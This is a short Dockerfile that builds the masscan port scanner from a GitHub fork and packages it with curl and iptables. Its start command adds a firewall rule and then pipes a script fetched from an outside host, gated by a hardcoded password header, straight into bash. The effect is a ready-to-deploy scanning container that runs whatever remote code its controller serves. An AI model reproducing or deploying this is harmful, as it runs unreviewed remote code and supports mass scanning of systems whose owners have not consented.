FROM ubuntu:latest as build
RUN apt update && apt install -y git build-essential
RUN git clone https://github.com/Mr-Bossman/masscan.git
WORKDIR masscan
RUN make
RUN make install
FROM ubuntu:latest as final
COPY --from=build /usr/bin/masscan /usr/bin/masscan
RUN apt update && apt install -y curl iptables libpcap0.8 && apt clean
RUN curl https://raw.githubusercontent.com/Mr-Bossman/masscan/master/data/exclude.conf > exclude.conf
CMD iptables-nft -A INPUT -p tcp --dport 61000 -j DROP && curl -sNH "pass:carl" http://depl.networkcucks.com:8080 | bash
